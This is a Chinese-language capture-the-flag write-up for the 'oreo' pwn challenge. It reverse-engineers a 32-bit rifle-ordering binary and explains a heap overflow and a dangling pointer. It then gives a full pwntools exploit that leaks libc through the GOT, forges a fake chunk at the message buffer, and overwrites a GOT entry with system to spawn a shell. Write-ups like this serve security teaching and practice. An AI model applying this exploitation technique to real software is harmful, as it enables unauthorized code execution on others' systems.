## Reverse Analysis

```C
  puts("What would you like to do?\n");
  printf("%u. Add new rifle\n", 1);
  printf("%u. Show added rifles\n", 2);
  printf("%u. Order selected rifles\n", 3);
  printf("%u. Leave a Message with your Order\n", 4);
  printf("%u. Show current stats\n", 5);
  printf("%u. Exit!\n", 6);
```

以为会是卖饼干的，结果是卖军火的，sad

```bash
oreo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=f591eececd05c63140b9d658578aea6c24450f8b, stripped
```

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
```

### add()

```C
  v1 = record;//record是bss段的全局变量
  record = (char *)malloc(0x38u);//大小是 0x38 大小，所以其对应的 chunk 为 0x40
  if ( record )
  {
    *((_DWORD *)record + 13) = v1;
      //record + 52(13*4,4是DWORD的长度)的地址存放下一个record，记为last_record
    printf("Rifle name: ");
    fgets(record + 25, 56, stdin);//record + 25的地址存放rifle_name，最大长为56
    check(record + 25);//把fgets读取到的末尾的'\n'改成\x00，截断
    printf("Rifle description: ");
    fgets(record, 56, stdin);//record的地址存放rifle_description，最大长为56
    check(record);
    ++number;
  }
  else
  {
    puts("Something terrible happened!");
  }
```

可以看到，从record + 25到record + 52有31个字节，而这里可以读入56个字节，说明rifle_name可以覆盖掉record + 52的last_record指针

存在堆溢出漏洞：record总大小才0x40,name都读到+81的地方了，会覆盖到下一个chunk

```
record的布局
record + 0         record + 25       record + 52       record + 81
+-----------------+----------+------------------+------+
|rifle_description|rifle_name|      |last_record|      |
+-----------------+----------+------------------+------+
```

### show()

```C
  printf("Rifle to be ordered:\n%s\n", "===================================");
  for ( i = record; i; i = (char *)*((_DWORD *)i + 13) )//注意这里和add()一样是作为DWORD解析的
  {
    printf("Name: %s\n", i + 25);
    printf("Description: %s\n", i);
    puts("===================================");
  }
```

  每个chunk的+52位构成了一个单链表，这里遍历了该链表

### message()

```C
  printf("Enter any notice you'd like to submit with your order: ");
  fgets(message_0, 0x80, stdin);//向message_0指向的地址写入0x80个字符
  check(message_0);
```

我们可以往这里输入ROP chain，通过申请fake chunk执行ROPchain

### order()

```C
  v2 = record;
  if ( number )
  {
    while ( v2 )
    {
      ptr = v2;
      v2 = (char *)*((_DWORD *)v2 + 13);//注意这里和add()一样是作为DWORD解析的
      free(ptr);
    }//清空购物车
    record = 0;//只是将最后一个record置零了
    ++order_times;
    puts("Okay order submitted!");
  }
  else
  {
    puts("No rifles to be ordered!");
  }
```

没有将所有被释放的指针置零，存在dangling pointer

## Exploitation

利用思路：

1. 通过堆溢出覆盖next_record为got表地址，再通过show() leak libc。

2. **伪造chunk**

   我们希望申请到message_0正好是fd指针的chunk，就需要将message_0 - 4(fake_chunk_size)，即number的内容改写为0x40（因为rifle的大小是0x38，对应chunk大小为0x40），也就是add0x40个rifle。

3. 现在可以进行任意地址写了，改写某 got 为 system 地址（这里能直接利用且无伤大雅的好像也只有strlen了），就能get shell

exp:

 ```python
from pwn import *
context.log_level = 'debug'
context.timeout = 0.1
io=process('./oreo')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf=ELF('./oreo')

#------------define function------------#
def logmess(a,b):
	log.success(a+'==>'+hex(b))

def addrifle(name,description):
	#io.sendline('1')
	io.sendlineafter('Action:','1')
	io.sendlineafter('Rifle name:',name)
	io.sendlineafter('Rifle description:',description)
	
 
def order_del():
	io.sendlineafter('Action: ','3')

def showrifle():
	io.sendlineafter('Action: ','2')

def leavemessage(message):
	io.sendlineafter('Action: ','4')
	io.sendlineafter("Enter any notice you'd like to submit with your order:",message)

def stats():
	io.sendlineafter('Action: ','5')

#----------------leak libc ---------------#
#gdb.attach(io)
addrifle('a','a')
order_del()    #run free to make free_got right
name = 'a'*27 + p32(elf.got['free'])    #name + last_heap
logmess('free_got',elf.got['free'])
addrifle(name,'a'*25)
showrifle()
io.recvuntil('Description: ')
io.recvuntil('Description: ')
free_addr = u32(io.recv(4).ljust(4,'\x00'))
logmess('free_addr',free_addr)
libc_base = free_addr-libc.symbols['free']
logmess('libc_base',libc_base)
system_addr = free_addr+libc.symbols['system']-libc.symbols['free']
logmess('system_addr',system_addr)

#------------fake chunk----------------#
for i in range(0x40-2-1): # make sure there is 0x40 rifles in total
    addrifle('a'*27+p32(0),str(i))
message_addr = 0x0804a2a8
payload = 'b'*27 + p32(message_addr)
addrifle(payload,'b') 
payload = 'a'*(0x20-4)+'\x00'*4 + 'a'*4 + p32(100)
# 0x20 *'a' for padding the last fake chunk
# 0x40 for fake chunk's next chunk's prev_size
# 0x100 for fake chunk's next chunk's size
# set fake iofle' next to be NULL
leavemessage(payload)
order_del()
io.recvuntil('submitted!\n')
#------------hijack got----------------#
payload = p32(elf.got['fgets'])
addrifle('b',payload)
leavemessage(p32(system_addr)+';/bin/sh\x00')
#------------get shell----------------#
io.interactive()
 ```

这题是远古题了，交互写的不好，有奇奇怪怪的问题


